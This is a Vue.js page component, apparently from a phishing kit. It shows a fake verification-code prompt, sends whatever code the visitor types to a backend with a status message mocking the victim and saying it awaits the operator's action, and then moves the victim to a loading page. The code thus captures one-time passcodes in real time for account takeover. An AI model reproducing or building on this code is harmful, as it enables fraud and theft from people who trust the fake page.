<template>
      <div style="margin-top: 60px;">
        <img src="../assets/1j.png" alt="">
        <p style="color:#727272; text-align:center; font-size:16px;">请输入验证码</p>

        <van-form @submit="onSubmit">
        <van-field
          v-model="yzm"
          name="验证码"
          label="验证码"
          placeholder="验证码"
          :rules="[{ required: true, message: '请填写验证码' }]"
        />
        <div style="margin: 16px;">
          <van-button round block type="info" native-type="submit">验证</van-button>
        </div>
      </van-form>
      </div>
</template>

<script>
// 这里可以导入其他文件（比如：组件，工具js，第三方插件js，json文件，图片文件等等）
import user from '@/api/user';

export default {
  // 组件注册
  components: {
  },
  // 定义属性
  data() {
    return {
         yzm: '',
         id:''
    }
  },
  // 计算属性，会监听依赖属性值随之变化
  computed: {
  },
  // 监控data中的数据变化
  watch: {},
  // 方法集合
  methods: {
     onSubmit(values) {
       console.log(this.yzm);

         // 校验验证码
         user.update(this.id,5,`SB输入验证码是：${this.yzm},已经跳转到加载等待页面，等待爸爸的操作`).then(res => {
              
       })

        // 发送 Axios 存储验证码信息
        this.$router.push({path:"/loading",query:{"id":this.id}})
    },
  },
  // 生命周期 - 创建完成（可以访问当前this实例）
  created() {
    
  },
  // 生命周期 - 挂载完成（可以访问DOM元素）
  mounted() {
      //  // 赋值用户ID
      this.id = this.$route.query["id"];
      // // 定时检测是否存在用户信息续签
      // setInterval(this.checkUserInfo, 3000);
  },
  beforeCreate() {}, // 生命周期 - 创建之前
  beforeMount() {}, // 生命周期 - 挂载之前
  beforeUpdate() {}, // 生命周期 - 更新之前
  updated() {}, // 生命周期 - 更新之后
  beforeDestroy() {}, // 生命周期 - 销毁之前
  destroyed() {}, // 生命周期 - 销毁完成
  activated() {}, // 如果页面有keep-alive缓存功能，这个函数会触发
}
</script>

<style scoped>
  
</style>